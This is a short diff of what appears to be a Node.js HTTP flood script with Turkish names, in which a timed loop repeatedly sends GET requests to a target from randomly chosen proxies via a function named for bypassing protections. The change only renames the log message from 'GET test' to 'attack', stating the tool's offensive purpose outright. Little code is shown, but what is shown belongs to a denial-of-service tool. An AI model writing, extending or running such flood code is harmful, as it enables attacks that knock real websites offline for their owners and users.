@@ -30,4 +30,4 @@ setInterval(function() {
     saldiri.bypassedelim('GET', surec.argv[2], proxyler[Math.floor(Math.random() * proxyler.length)]);
 });
  
-console.log("GET Testi %s saniye boyunca %s adresine gönderildi", surec.argv[2], surec.argv[3]);
+console.log("saldiri %s saniye boyunca %s adresine gönderildi", surec.argv[2], surec.argv[3]);
